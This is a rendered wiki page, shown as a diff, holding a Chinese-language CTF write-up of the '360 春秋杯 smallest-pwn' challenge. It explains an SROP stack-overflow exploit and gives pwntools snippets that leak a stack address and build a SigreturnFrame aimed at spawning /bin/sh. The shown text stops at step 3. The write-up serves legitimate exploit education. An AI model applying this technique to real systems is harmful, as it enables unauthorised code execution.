@@ -1,0 +1,1187 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/">
+      
+      <link rel="shortcut icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>Writeup - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#360-smallest-pwn" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
+    
+    <label class="md-nav__link" for="nav-1-1">
+      IO_FILE
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="IO_FILE" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        IO_FILE
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      libc2.24下IO_FILE的利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../IO_FILE/Pwn_IO_FILE/" class="md-nav__link">
+      Pwn_IO_FILE
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" >
+    
+    <label class="md-nav__link" for="nav-1-2">
+      Heap
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Heap" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        <span class="md-nav__icon md-icon"></span>
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      堆基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/off_by_one/" class="md-nav__link">
+      off_by_one
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/fastbin/" class="md-nav__link">
+      fastbin attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/" class="md-nav__link">
+      堆重叠&拓展
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/use_after_free/" class="md-nav__link">
+      UAF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/unlink/" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/realloc/" class="md-nav__link">
+      realloc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/unsorted_bin_attack/" class="md-nav__link">
+      unsorted_bin_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/Libc2.29%E7%B1%BBunlink_attack/" class="md-nav__link">
+      libc2.29类unlink_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+      沙盒堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2-11" type="checkbox" id="nav-1-2-11" >
+    
+    <label class="md-nav__link" for="nav-1-2-11">
+      House技术
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="House技术" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-11">
+        <span class="md-nav__icon md-icon"></span>
+        House技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/House/House_Of_Force/House_Of_Force/" class="md-nav__link">
+      House_Of_Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../glibc-heap/House/House_of_Lore/House_of_Lore/" class="md-nav__link">
+      House_of_Lore
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3" >
+    
+    <label class="md-nav__link" for="nav-1-3">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+    
+    <label class="md-nav__link" for="nav-2">
+      Stack
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Stack" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Stack
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+    
+    <label class="md-nav__link" for="nav-2-1">
+      ROP
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="ROP" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        ROP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      蒸米ROP笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../srop/" class="md-nav__link">
+      SROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Canary/" class="md-nav__link">
+      Canary
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+      栈迁移
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/" class="md-nav__link">
+      fini_array劫持
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" >
+    
+    <label class="md-nav__link" for="nav-3">
+      Misc
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Misc" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../../Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/" class="md-nav__link">
+      文件的结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../../Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="md-nav__link">
+      ZIP压缩包伪加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../../Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/" class="md-nav__link">
+      内存取证-volatility
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Crypto
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../../Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/" class="md-nav__link">
+      CTF密码学中python库应用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../../Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+      yafu安装及使用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../../../Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      RSA加密笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#360-smallest-pwn" class="md-nav__link">
+    360 春秋杯 smallest-pwn
+  </a>
+  
+    <nav class="md-nav" aria-label="360 春秋杯 smallest-pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-0" class="md-nav__link">
+    step 0
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1" class="md-nav__link">
+    step 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2" class="md-nav__link">
+    step 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3" class="md-nav__link">
+    step 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4" class="md-nav__link">
+    step 4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5" class="md-nav__link">
+    step 5
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6" class="md-nav__link">
+    step 6
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/stackoverflow/SROP/360 春秋杯 smallest-pwn/writeup.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  <h1>Writeup</h1>
+                
+                <h2 id="360-smallest-pwn">360 春秋杯 smallest-pwn<a class="headerlink" href="#360-smallest-pwn" title="Permanent link">&para;</a></h2>
+<h3 id="_1">基本情况<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>只有几行汇编，通过系统调用号 0 调用 read 向 buf 写入 0x400 字节，造成栈溢出。</p>
+<p>直观可以看到一个 gadget ：<code>syscall;ret;</code> ，这是 srop 非常典型的 gadget 。</p>
+<h3 id="_2">思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>由于程序中并没有 sigreturn 调用，所以我们得自己构造，正好这里有 read 函数调用，所以我们可以通过 read 函数读取的字节数来设置 rax 的值。重要思路如下</p>
+<ul>
+<li>通过控制 read 读取的字符数来设置 RAX 寄存器的值，从而执行 sigreturn</li>
+<li>通过 syscall 执行 execve("/bin/sh",0,0) 来获取 shell。</li>
+</ul>
+<p>基本流程为</p>
+<ul>
+<li>读取三个程序起始地址</li>
+<li>程序返回时，利用第一个程序起始地址读取地址，修改返回地址 (即第二个程序起始地址) 为源程序的第二条指令，并且会设置 rax=1</li>
+<li>那么此时将会执行 write(1,$esp,0x400)，泄露栈地址。</li>
+<li>利用第三个程序起始地址进而读入 payload</li>
+<li>再次读取构造 sigreturn 调用，进而将向栈地址所在位置读入数据，构造 execve('/bin/sh',0,0)</li>
+<li>再次读取构造 sigreturn 调用，从而获取 shell。</li>
+</ul>
+<h4 id="step-0">step 0<a class="headerlink" href="#step-0" title="Permanent link">&para;</a></h4>
+<p>溢出写入 3 个程序起始地址（start_addr），用于 step012 结束后返回程序开始位置。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step0==</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>   <span class="c1">#step012</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="step-1">step 1<a class="headerlink" href="#step-1" title="Permanent link">&para;</a></h4>
+<p>首先是要写入 1 字节，让 rax 变成 1 （write 系统调用号）。然后是需要修改跳转地址到 <code>0x4000B3</code> 绕开 xor ，保持 rax 的值，刚好写入指针指向的是 step 1 的返回地址，step 0 提前布置写入了 start_addr ，这里刚好覆盖最后一字节。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step1==</span>
+<span class="c1">## modify the return addr to start_addr+3</span>
+<span class="c1">## so that skip the xor rax,rax; then the rax=1</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xb3</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># 第二个start_addr</span>
+                <span class="c1"># 写入一个字节，让rax变成1，也就是系统调用号1 write</span>
+                <span class="c1"># 同时这个是覆盖写入第二个start_addr最低字节，直接控制跳转0x4000B3保存rax的值</span>
+</code></pre></div>
+<h4 id="step-2">step 2<a class="headerlink" href="#step-2" title="Permanent link">&para;</a></h4>
+<p>接收地址，正常跳转回 start_addr </p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step2==</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>    <span class="c1"># 接受rsp下一个内存块中的栈地址</span>
+                                    <span class="c1"># 第三个start_addr</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;leak stack addr :&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+</code></pre></div>
+<h4 id="step-3">step 3<a class="headerlink" href="#step-3" title="Permanent link">&para;</a></h4>
+<p>写入伪造的 SigreturnFrame 。写入的指针又是当前栈的返回地址，所以 payload 先填入返回地址 start_addr 。然后用 8 字节填充之后再写入 SigreturnFrame ，ROP 之后 rsp 会向高地址抬 8 个字节（指向这 8 个字节所在的地址），空出来放 step 4 的 syscall_ret 。sigframe 不去除前 8 字节的 rt_signalret 是留空间给 step 4 用作填充空间。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ==step3==</span>
+<span class="c1">## make the rsp point to stack_addr</span>
+<span class="c1">## the frame is read(0,stack_addr,0x400)</span>
+<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x400</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
